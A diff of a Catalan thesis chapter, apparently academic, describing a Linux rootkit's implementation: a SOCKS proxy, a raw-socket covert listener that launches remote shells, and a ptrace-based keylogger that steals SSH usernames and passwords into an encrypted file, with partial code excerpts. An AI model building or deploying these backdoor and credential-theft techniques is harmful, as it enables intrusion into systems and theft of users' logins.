-formals}. Un cop localitzades, i estudiades, s'ha decidit implementar la versió 4 i la versió 4a ja 
+El primer a fer ha estat buscar les especificacions formals del protocol\footnote{Les especificacions 
+formals de la versió 4 no compten amb un rfc a ietf sinó que varen ser publicades per l'empresa NEC \url{http://ftp.icm.edu.pl/packages/socks/socks4/SOCKS4.protocol}.}. Un cop localitzades, i estudiades, s'ha decidit implementar la versió 4 i la versió 4a, ja 
 que ofereixen exactament el què necessitem. \\
 
 Com veurem a continuació, la diferència entre la versió 4 i 4a, rau en què la versió 4, el servei de socks
 espera rebre una direcció on connectar-se, i en la 4a rep un domini que el propi servei de socks ha de
-resoldre. Ambdues versions del protocol, en un primer moment el client envia una capçalera, i un cop enviada,
-si el servei de socks és capaç de establir-hi una connexió, la connexió que ha inicilitzat el client, es
-transforma en la connexió que ha solicitat sent el servidor socks, un intermediari.
+resoldre. Ambdues versions del protocol, en un primer moment, el client envia una capçalera, i un cop enviada,
+si el servei de socks és capaç d'establir-hi una connexió, la connexió que ha inicilitzat el client es
+transforma en la connexió que ha solicitat, sent el servidor socks un intermediari.
 
 \begin{figure}[htp]
 \begin{Verbatim}[commandchars=@\[\]]
@@ -631,12 +654,11 @@ transforma en la connexió que ha solicitat sent el servidor socks, un intermedi
     @PYaE[// if client is using socks4a]
     in.s_addr @PYbe[=] req.dstip;
     @PYay[if] (strstr(inet_ntoa(in), @PYaB["]@PYaB[0.0.0]@PYaB["])) {
-		@PYaJ[char] dstip4a@PYZlb[]@PYag[1024]@PYZrb[];
-		read((@PYaJ[int])sock, dstip4a, @PYag[1024]);
-		req.dstip @PYbe[=] resolve(dstip4a, @PYag[0]);
+        @PYaJ[char] dstip4a@PYZlb[]@PYag[1024]@PYZrb[];
+        read((@PYaJ[int])sock, dstip4a, @PYag[1024]);
+        req.dstip @PYbe[=] resolve(dstip4a, @PYag[0]);
 	}
 
-    @PYaE[// socks]
     @PYaJ[int] sock2;
     @PYay[if] ((sock2 @PYbe[=] launcher_rcon(req.dstip, ntohs(req.dstport))) @PYbe[>] @PYag[0]) {
         debug(@PYaB["]@PYaB[Connected!]@PYao[\n]@PYaB["]);
@@ -648,39 +670,36 @@ transforma en la connexió que ha solicitat sent el servidor socks, un intermedi
         req.cd @PYbe[=] @PYag[91];
         write((@PYaJ[int])sock, @PYbe[&]req, @PYay[sizeof](req));
     }
-    close((@PYaJ[int])sock);
-    close(sock2);
-    exit(@PYag[0]);
-}
 \end{Verbatim}
     \caption{socksd.c::pthread\_socks()}
     \label{fig:socksd}
 \end{figure}
 
-En la figura \ref{fig:socksd} es mostra la funció més caracteristica d'aquesta funcionalitat, ja que és 
+En la figura \ref{fig:socksd} es mostra la funció més característica d'aquesta funcionalitat, ja que és 
 la funció que interpreta les capçaleres socks4 i socks4a. En ella, podem veure com omplim l'estructura
 message amb la capçalera que ens envia el client. Just després, es comproba si la destinació és una 
 destinació vàlida o no, i en cas de no ser-ho, es llegeix més enllà de la capçalera on si espera trobar 
 el nom DNS del host on establir la connexió. \\
 Com podem veure, just abans de passar a reenviar incondicionalment tot el tràfic entre els dos cantons
-de la conneixó, cal que enviem al client, un missatge comunicant-li si la connexió s'ha pogut establir
+de la conneixó, cal que enviem al client un missatge comunicant-li si la connexió s'ha pogut establir
 o no.
 
 \section{Entorn privilegiat}
 En l'entorn privilegiat, el nostre rootkit s'aprofita de la possibilitat de poder utilitzar raw sockets 
 per tal d'implementar modes de comunicació pensats per comunicar-se amb sistemes molt protegits i xarxes 
-molt restrictives, i de la possibilitat de debugar serveis del sistema. \\
+molt restrictives, així com de la possibilitat de debugar serveis del sistema. \\
 
 Una descripció més conceptual del funcionament d'aquest protocol de comunicació, ha estat comentada en 
-detall i amb l'ajuda d'esquemes en l'apartat de disseny del rootkit (POSAR REFERÈNCIA). Per al major 
-aprofitament d'aquest punt, se'n recomana la lectura. \\
+detall amb l'ajuda d'esquemes en la secció \ref{sec:disseny_mode_privilegiat} del capítol de disseny de la 
+solució. Per al major 
+aprofitament d'aquest punt, se'n recomana la lectura prèvia. \\
 
 \subsection{Modes de comunicació}
-Tal i com es pot veure en la figura \ref{fig:launcher_raw_daemon} , el rootkit en execució en un entorn 
+Tal i com es pot veure en la figura \ref{fig:launcher_raw_daemon}, quan el rootkit es troba en execució en un entorn 
 privilegiat, es troba executant un while on cada paquet de xarxa que arriba a la màquina (independentment
 de si el port de destí està obert o no), la funció recvfrom el rep. Com que la majoria de paquets que
-rebrà una màquina, no seran paquets nostres, ens interessa que aquesta funció tingui la menor latencia 
-possible per afectar el mínim possible a la màquina on corri el nostre rootkit. \\
+rebrà una màquina, no seran paquets nostres, ens interessa que aquesta funció tingui la menor latència 
+possible per afectar el mínim possible a la màquina on s'executi el nostre rootkit. \\
 
 \begin{figure}[htp]
 \begin{Verbatim}[commandchars=@\[\]]
@@ -700,10 +719,11 @@ antidebug_obfuscate_analysis(@PYag[16]);
         @PYay[if] (@PYbe[!]memcmp(CLIENTAUTH, p.action.pass, @PYag[20])) {
             debug(@PYaB["]@PYaB[S'ha rebut el paquet d'autenticat (action: %d)]@PYao[\n]@PYaB["], p.action.action);
             do_action(@PYbe[&](p.action), @PYbe[&]raw.sin_addr, ntohs(p.tcp.dest), @PYag[0]);
-        } @PYay[else] @PYay[if] (@PYbe[!]memcmp(CHECKSTR, p.action.pass, @PYag[20]) @PYbe[&]@PYbe[&] (p.action.action @PYbe[=]@PYbe[=] CHECK @PYbe[|]@PYbe[|] p.action.action @PYbe[=]@PYbe[=] REVCHECK)) {
+        } @PYay[else] @PYay[if] (@PYbe[!]memcmp(CHECKSTR, p.action.pass, @PYag[20]) 
+            @PYbe[&]@PYbe[&] (p.action.action @PYbe[=]@PYbe[=] CHECK @PYbe[|]@PYbe[|] p.action.action @PYbe[=]@PYbe[=] REVCHECK)) {
             debug(@PYaB["]@PYaB[S'ha rebut el paquet de CHECK]@PYao[\n]@PYaB["]);
             do_action(@PYbe[&](p.action), @PYbe[&]raw.sin_addr, ntohs(p.tcp.dest), @PYag[0]);
-		}
+        }
     }
 }
 \end{Verbatim}
@@ -711,17 +731,17 @@ antidebug_obfuscate_analysis(@PYag[16]);
     \label{fig:launcher_raw_daemon}
 \end{figure}
 
-La primera comprobació que es fa, és la del tamany de paquet. Si el tamany de paquet rebut no és exactament
+La primera comprovació que es fa, és la del tamany de paquet. Si el tamany de paquet rebut no és exactament
 la dels nostres paquets, aquest paquet ja pot ser descartat. Gràcies a això, podem descartar la majoria de 
 paquets que no van destinats al rootkit. En cas que un paquet ocupi exactament com els nostres paquets, 
-caldrà comprobar si es tracta d'un paquet autenticat amb la contrasenya escollida en el moment de la 
-compilació (CLIENTAUTH) o si es tracta d'una comprobació per veure si el rootkit està instal·lat o no 
-(independentment de coneixer la contrasenya o no). \\
+caldrà comprobar si es tracta d'un paquet autenticat amb la contrasenya correcte o si es tracta d'una 
+comprovació per veure si el rootkit es troba instal·lat.
+(independentment de conèixer la contrasenya o no). \\
 
-Un cop ens arribi un paquet autenticat, d'aquest se li extreu el típus d'acció a executar.
+Un cop ens arribi un paquet autenticat, d'aquest se li extreu el tipus d'acció a portar a terme, i s'executa.
 
 \subsubsection{Mode de comunicació REV}
-En cas que en el paquet rebut es soliciti realitzar una acció de tipus reversa, el primer que caldrà fer
+En cas que en el paquet rebut sol·liciti realitzar una acció de tipus inversa, el primer que caldrà fer
 és establir una connexió amb l'origen del paquet. \\
 
 \begin{figure}[htp]
@@ -755,40 +775,132 @@ En cas que en el paquet rebut es soliciti realitzar una acció de tipus reversa,
     \label{fig:launcer_do_rev_action}
 \end{figure}
 
-Podem veure en la figura \ref{fig:launcer_do_rev_action} que aquesta conneixó serà establerta utilitzant
-la funció launcher\_rcon() que un cop estableixi la connexió amb l'origen del paquet (ip->s\_addr i d->port)
-retorna un socket que és el què serà utilitzat.
+Podem veure en la figura \ref{fig:launcer_do_rev_action} que aquesta connexió serà establerta utilitzant
+la funció launcher\_rcon(), que un cop s'estableixi la connexió amb l'origen del paquet (s\_addr i port),
+aquesta retorna un socket que serà utilitzat per a tota la comunicació. \\
 
+Com podem veure, hem aconseguit justament el què voliem: que fos el launcher qui establís la connexió amb
+el client.
 
 \subsubsection{Mode de comunicació RAW}
+En el cas d'una acció de tipus raw, el paquet pot ser de tres tipus diferents:
+\begin{itemize}
+\item Inicialització d'una acció.
+\item Paquet de sessió (dades d'una sessió ja inicialitzada).
+\item Finalització d'una sessió/acció.
+\end{itemize}
+
+Un paquet d'inicialització d'acció serveix (tal i com el nom indica) per inicialitzar una acció a través
+d'una connexió RAW. \\
+
+Per tal d'establir una connexió totalment raw, ens caldrà poder enviar paquets a part de rebre'n. Per fer 
+això, cada sessió raw tindrà associat un procés encarregat de fer l'enviament raw dels paquets. \\
+
+Això s'ha decidit fer d'aquesta manera principalment per dos motius. El primer motiu, ha estat deixar 
+el màxim de lleuger el codi de la figura \ref{fig:launcher_raw_daemon}, ja que serà el què estarà en execució la majoria del temps.
+El segon motiu, és que fent-ho així, aconseguim poder utilitzar exactament les mateixes funcions utilitzades
+en els altres modes de comunicació, ja que aquest cop només cal que el procés que realitza l'acció 
+comparteixi la pipe de lectura amb el procés que està constantment execució (que serà qui rebrà les dades
+enviades pel client dintre paquets amb l'acció RAWSESSION), i compartir la pipe d'escriptura amb aquest altre
+procés d'enviament de paquets que estarà pendent de si apareixen noves dades a la pipe, per a posar-les en
+paquets raw autenticats i enviar-los cap al client.
+
+\begin{figure}[htp]
+\begin{Verbatim}[commandchars=@\[\]]
+@PYay[case] SHELL:
+    debug(@PYaB["]@PYaB[Launching shell]@PYao[\n]@PYaB["]);
+    @PYay[if] (@PYbe[!]getuid()) {
+        debug(@PYaB["]@PYaB[Starting DirectRAW service]@PYao[\n]@PYaB["]);
+        r @PYbe[=] create_rawsock_session(rawsocks, ip@PYbe[-]@PYbe[>]s_addr, sport, d@PYbe[-]@PYbe[>]port);
+    	@PYay[if] (fork()) @PYay[return];
+        launcher_shell(r@PYbe[-]@PYbe[>]r@PYZlb[]@PYag[0]@PYZrb[], r@PYbe[-]@PYbe[>]w@PYZlb[]@PYag[1]@PYZrb[]);
+    	destroy_rawsock_session(r);
+    } @PYay[else] {
+    	@PYay[if] (fork()) @PYay[return];
+        launcher_shell(sock, sock);
+        close(sock);
+    }
+    @PYay[break];
+\end{Verbatim}
+    \caption{launcher.c::do\_action()}
+    \label{fig:launcer_do_raw_action}
+\end{figure}
+
+Tal i com es pot veure a la figura \ref{fig:launcer_do_raw_action}, el primer que cal fer és crear la sessió utilitzant la funció
+create\_rawsock\_session() que ens inicialitzarà un rawsocket. Un cop inicialitzat, disposarem de les dues 
+pipes (una de lectura i una d'escriptura), que seran les utilitzades pel procés que executarà l'acció, 
+igual que en els altres modes de comunicació s'utilitzaven els sockets.\\
+
+\begin{figure}[htp]
+\begin{Verbatim}[commandchars=@\[\]]
+@PYay[struct] rawsock {
+    @PYaJ[unsigned] @PYaJ[short] dport;
+    @PYaJ[unsigned] @PYaJ[short] sport;
+    @PYaJ[unsigned] @PYaJ[long] host;
+    @PYaJ[int] r@PYZlb[]@PYag[2]@PYZrb[];
+    @PYaJ[int] w@PYZlb[]@PYag[2]@PYZrb[];
+	@PYaJ[int] pid;
+};
+\end{Verbatim}
+    \caption{raw.h::struct rawsock}
+    \label{fig:struct_rawsock}
+\end{figure}
+
+L'estructura rawsock és la que conté tota la informació de la sessió. Com es pot veure a la figura \ref{fig:struct_rawsock},
+aquesta estructura conté els dos parells d'enters que seran utilitzats per inicialitzar les dues pipes, i
+un pid que serà on es guardarà l'identificador del nostre procés, encarregat de realitzar els enviaments. \\
+En aquesta estructura també guardem el port origen, destí i ip origen de la connexió, que són utilitzats per 
+identificar la sessió raw a la què fan referència els paquets de sessió raw que es van revent. Aquestes dades
+també són utilitzades per saber on realitzar l'enviament. \\
+
+\begin{figure}[htp]
+\begin{Verbatim}[commandchars=@\[\]]
+@PYay[case] RAWSESSION:
+    debug(@PYaB["]@PYaB[Raw session packet]@PYao[\n]@PYaB["]);
+    r @PYbe[=] find_rawsock_session(rawsocks, ip@PYbe[-]@PYbe[>]s_addr, sport, d@PYbe[-]@PYbe[>]port);
+    fill_rawsock_session(r, d@PYbe[-]@PYbe[>]bytes, d@PYbe[-]@PYbe[>]size);
+    @PYay[return];
+\end{Verbatim}
+    \caption{launcher.c::do\_action()}
+    \label{fig:launcer_rawsession}
+\end{figure}
+
+Finalment, podem observar a la figura \ref{fig:launcer_rawsession} que quan ens arriba un paquet de 
+tipus rawssession, el què es fa, és buscar a quin rawsock fa referència utilitzant la funció 
+find\_rawsock\_session(), i un cop localitzat, s'hi envien directament les dades rebudes.
+
+
  
 \subsection{Keylogger}
-La idea que hi havia a l'hora d'implementar el keylogger, era que aquest no s'implementés com a mòdul o
-utilitzant la injecció de codi en el kernel, ja que aquesta tècnica depen molt de la versió de kernel que 
-s'estigui utilitzant en un moment donat. Com que per aquest funcionalitat disposem de accés de root, podem
-fer gairebé qualsevol cosa a nivell d'usuari, i per aquest motiu, pensavem que seria possible. \\
+La idea que hi havia a l'hora d'implementar el keylogger, era que aquest no s'implementés com a mòdul ni
+utilitzant la injecció de codi en el kernel, ja que aquestes tècniques depenen molt de la versió de kernel que 
+s'estigui utilitzant en un moment donat. Com que per aquesta funcionalitat disposem d'accés de root, podem
+fer gairebé qualsevol cosa a nivell d'usuari, i per aquest motiu, pensavem que seria possible fer això sense recórrer
+a codi del kernel.\\
 
-Cal dir que l'objectiu principal per aquesta funcionalitat, es el de permetre'ns recuperar el password de l'usuari
-root o almenys la d'algun usuari del sistema. Per aquest motiu, el servei que s'ha posat com a objectiu, ha estat el OpenSSH\footnote{Openssh .....}
+Cal dir que l'objectiu principal per aquesta funcionalitat és el de permetre'ns recuperar el password de l'usuari
+root o almenys la d'algun usuari del sistema. Per aquest motiu, el servei que s'ha posat com a objectiu, ha estat el OpenSSH\footnote{\href{http://www.openssh.com/}{Openssh} és 
+el servei d'ssh utilitzat per excel·lència en els sistemes UNIX que permeten administrar i usar remotament una màquina de 
+forma segura.}.
 Aquest servei s'acostuma a trobar instal·lat a la majoria de màquines UNIX i permet a usuaris de sistema
-autenticar-se per a usar i administrar la màquina. Cal tenir en compte que aquest servei és considerat seguir
-ja que utilitzar algoritmes criptogràfics així com claus públiques i privades.\\
+autenticar-se per a usar i administrar la màquina. Cal tenir en compte que aquest servei és considerat segur,
+ja que utilitza algoritmes criptogràfics molt segurs, així com claus públiques i privades.\\
 
-La primera opció que es va seguir per tal de poder llegir els passwords del sistema, va ser intentar 
+La primera opció que es va seguir per tal de poder llegir els passwords dels usuaris que s'autentiquessin al sistema, va ser intentar 
 interceptar totes les escriptures a els dispositius tipus tty o pts. Aquests dispositius són els què reben 
-les dades ja en clar i comuniquen el servei de Openssh amb la shell del sistema. \\
-La idea era comprobar quins dispositius estava utilitzant l'ssh i començar a llegir d'ells, el problema que
+les dades ja en clar, i comuniquen el servei de Openssh amb la shell del sistema. \\
+La idea era comprobar quins dispositius estava utilitzant l'ssh i començar a llegir d'ells. El problema que
 varem tenir, és que si el nostre keylogger llegia del dispositiu, llavors l'aplicació en qüestió no revia les
 dades, sinó que l'únic que les revia era el keylogger. El primer que es va intentar per arreglar això,
 va ser intentar un cop llegides les dades, ser capaços de escriure-les a algun altre lloc per a què
-l'aplicació les acabés rebent, el què passa és que el funcionament dels termianls tty y pts, estan pensants
+l'aplicació les acabés rebent, el què passa és que el funcionament dels termianls tty y pts estan pensants
 justament per evitar això.\\
 
-En definitiva això permetria recuperar el password, però alhora deixa inhabilitat el servei denegant així 
+En definitiva, aquesta tècnica permetria recuperar els passwords dels usuaris, però alhora deixa inhabilitat el servei denegant així 
 totes les possibles noves connexions. \\
 
-La segona opció que teníem ja va resultar. Aquesta tractava de que el nostre keylogger debuggués l'aplicació
-en qüestió podent així interceptar cada crida al sistema, i poder seguir l'execució del servei fins al moment
+Amb la segona opció ja s'han obtingut uns resultats satisfactoris. Aquesta tracta de que el nostre keylogger debugui l'aplicació
+en qüestió, podent així interceptar cada crida al sistema, i poder seguir l'execució del servei fins al moment
 en què el servei intenta autenticar-se al sistema utilitzant les dades que el client de ssh li ha passat. \\
 
 El funcionament del keylogger queda doncs resumit en aquests passos:
@@ -800,26 +912,26 @@ El funcionament del keylogger queda doncs resumit en aquests passos:
 \item Emmagatzemament de les dades capturades en un fitxer xifrat.
 \end{enumerate}
 
-El primer punt és la localització del procés sshd. Per trobar-lo s'ha utilitzat la búsqueda a través del
+El primer punt és la localització del procés sshd. Per trobar-lo s'ha utilitzat la cerca a través del
 directori /proc. Es busca un procés que pengi del procés init, i que tingui el nom de sshd. \\
 
-Un cop trobat aquest procés, el primer que fa el keylogger, és canviar-se el nom de procés a el nom 
+Un cop trobat aquest procés, el keylogger es canvia el nom de procés a el nom 
 exacte que té el procés que vol debugar. Un cop fet això, cal attachar-s'hi utilitzant la crida de sistemes 
-POSIX ptrace. A partir d'aquest moment, es pot dir que estem debugant el servei. \\
+POSIX ``ptrace''. A partir d'aquest moment, es pot dir que estem debugant el servei. \\
 
-Un cop attachat el keylogger espera que el servei Openssh executi les crides a sistema clone() i read().
-La crida clone() és utilitzada per a crear nous processos per atendre les noves connexions en les què
+Un cop attachat, el keylogger espera que el servei Openssh executi les crides a sistema clone() i read().
+La crida clone() és utilitzada per a crear els nous processos que atendran les noves connexions en les què
 hi haurà un usuari intentant-se autenticar. La crida read() és utilitzada per a llegir l'usuari i password
 que l'usuari entra i amb els què es vol autenticar. \\
 
-En el moment que el keylogger detecta que arriba una nova connexió, aquest s'attacha a el nou procés creat
+En el moment que el keylogger detecta que arriba una nova connexió, aquest s'attacha al nou procés creat
 per a l'Openssh, i el segueix fins a rebre les dades d'autenticació (usuari i password). Un cop els té,
 deixa de debugar el procés i li permet la seva normal execució. \\
 
 Les dades capturades són emmagatzemades en un fitxer relatiu al home del rootkit anomenat ``.k\_sshd''. 
 El contingut d'aquest fitxer està xifrat amb el mateix password que s'utilitza per xifrar el contingut
-dels paquets de xarxa així com per autenticar el client amb el launcher. Per tal de poder accedir de
-manera fàcil al contingut en clar d'aquest fitxer, el propi launcher permet ser llançat per tal de desxifrar
+dels paquets de xarxa, així com per autenticar el client amb el launcher. Per tal de poder accedir de
+manera fàcil al contingut en clar d'aquest fitxer, el propi launcher permet ser llançat per desxifrar
 el fitxer ``.k\_sshd''.
 
 \begin{figure}[htp]
@@ -828,7 +940,7 @@ el fitxer ``.k\_sshd''.
 	@PYaE[// Password string is | uint | chars |]
 	@PYay[if] (len @PYbe[>] @PYag[32] @PYbe[|]@PYbe[|] len @PYbe[<] @PYag[5]) @PYay[return] @PYag[0];
 
-    @PYaE[// ptr points to the last char of the string]
+	@PYaE[// ptr points to the last char of the string]
 	@PYaJ[unsigned] @PYaJ[char] @PYbe[*]ptr @PYbe[=] buff@PYbe[+]len@PYbe[-]@PYag[1];
 	@PYay[while] (@PYbe[*]ptr @PYbe[!]@PYbe[=] @PYaT[0x00]) ptr@PYbe[-]@PYbe[-];
 
@@ -839,32 +951,33 @@ el fitxer ``.k\_sshd''.
 	@PYaE[// Now bytes from ptr+2 to buff+len-1 has to be exactly *ptr+1]
 	@PYay[if] (((buff@PYbe[+]len@PYbe[-]@PYag[1])@PYbe[-](ptr@PYbe[+]@PYag[1])) @PYbe[!]@PYbe[=] @PYbe[*](ptr@PYbe[+]@PYag[1])) @PYay[return] @PYag[0];
 
-    @PYay[if] (useRc4) {
-        rc4_init((@PYaJ[unsigned] @PYaJ[char] @PYbe[*])RC4KEY, @PYay[sizeof](RC4KEY), @PYbe[&]rc4_crypt);
-        rc4(ptr@PYbe[+]@PYag[2], @PYbe[*](ptr@PYbe[+]@PYag[1]), @PYbe[&]rc4_crypt);
-    }
-    write(@PYag[1], ptr@PYbe[+]@PYag[2], @PYbe[*](ptr@PYbe[+]@PYag[1]));
-    putchar(@PYac['\n']);
+	@PYay[if] (useRc4) {
+		rc4_init((@PYaJ[unsigned] @PYaJ[char] @PYbe[*])RC4KEY, @PYay[sizeof](RC4KEY), @PYbe[&]rc4_crypt);
+		rc4(ptr@PYbe[+]@PYag[2], @PYbe[*](ptr@PYbe[+]@PYag[1]), @PYbe[&]rc4_crypt);
+	}
+	write(@PYag[1], ptr@PYbe[+]@PYag[2], @PYbe[*](ptr@PYbe[+]@PYag[1]));
+	putchar(@PYac['\n']);
 
-    @PYay[return] @PYag[1];
+	@PYay[return] @PYag[1];
 }
 \end{Verbatim}
     \caption{keylogger.c::check\_ssh\_password()}
     \label{fig:keylogger_check_password}
 \end{figure}
       
-En la figura \ref{fig:keylogger} es mostra el tros de codi que comproba que l'string llegit és un string 
-de usuari o de password i en cas de ser-ho ho xifra i ho escriu al fitxer en qüestió ja que previament 
+En la figura \ref{fig:keylogger_check_password} es mostra el tros de codi que comprova que l'string llegit és un string 
+d'usuari o de password i en cas de ser-ho ho xifra i ho escriu al fitxer en qüestió, ja que previament 
 s'hi ha mapejat el descriptor de fitxer 1. Aquesta funció és cridada quan s'intercepta un string llegit per
 un read() per a comprobar que segueix el format que utilitza l'Openssh. \\
 
-Com és evident, per tal de poder desenvolupar el keylogger per l'Openssh, va caldre un gran estudi del 
+Com és evident, per tal de poder desenvolupar aquest keylogger per l'Openssh, ha calgut un gran estudi del 
 comportament d'aquest software per ser capaços de detectar com i quan es transfereixen les dades d'usuari i
 password. \\
+
 En aquest anàlisis, ens varem donar compte que les dades en clar utilitzades durant l'autenticació, eren
-transferides utilitzant un format en concret que és el què aquesta funció comproba. El format en qüestió
-és TAG + LONGITUD + DADES on les dades és un string. Tenint en compte que un password serà normalment més
-curt que 255 caràcters, i que la longitud està expressada en 4 bytes, aquesta funció comproba que el format
+transferides utilitzant un format en concret que és el què aquesta funció comprova. El format en qüestió
+és TAG + LONGITUD + DADES, on les dades és un string. Tenint en compte que un password serà normalment més
+curt que 255 caràcters, i que la longitud està expressada en 4 bytes, aquesta funció comprova que el format
 es compleix. \\
 
 \begin{figure}[htp]
@@ -905,7 +1018,7 @@ antidebug_obfuscate_analysis(@PYag[3]);
 
 En la figura \ref{fig:keylogger_main} podem veure com un cop ja estem attachats al procés principal del 
 Openssh, anem seguin les diferents crides a sistema per trobar en aquest cas un clone(). En el moment
-en que es retorni de la crida clone(), capturem el valor del registre eax que correspon al pid del procés
+en que es retorni la crida clone(), capturem el valor del registre eax que correspon al pid del procés
 fill o 0 en cas de ser el propi fill. Quan en el pare obtenim el pid del fill acabat de crear, saltem a la 
 funció lookForReads() tot passant-li el nou pid a seguir. En aquest funció, es crearà un nou procés del 
 nostre keylogger, que segurà exclusivament aquest nou procés que acaba de crear l'Openssh. En aquesta nova
@@ -916,12 +1029,12 @@ que aquest arrivi al procés que estem debugant, o fins i tot, farà que deixem 
 que es vol aturar el servei. \\
 
 Per acabar, comentar que aquest keylogger s'ha implementat només per i386 i funciona per tota la branca 
-de l'Openssh de la versió 2.x. Tot i això, el fet de passar-la a x86\_64, és trivial i es farà fora de 
+de l'Openssh de la versió 2.x. Tot i això, el fet de passar-la a x86\_64 no té complicació i es farà fora de 
 l'àmbit del projecte. També comentar que la intenció és acabar-hi afegint nous serveis per a que el keylogger
 sigui capaç de capturar informació d'altres fonts.
 
 \subsection{Injecció de codi en memòria del nucli}
-En el transcurs del projecte, l'equip que desenvolupa el kernel de Linux, varen aplicar un 
+En el transcurs del projecte, l'equip que desenvolupa el kernel de Linux varen aplicar un 
 patch\footnote{\href{Patch que evita l'ús de /dev/mem per accedir a la memòria}{http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=ae531c26c5c2a28ca1b35a75b39b3b256850f2c8}} que evita
 l'accés a la memòria a través de /dev/mem quedant així totalment impossibilitada la tècnica que es volia 
 utilitzar. 
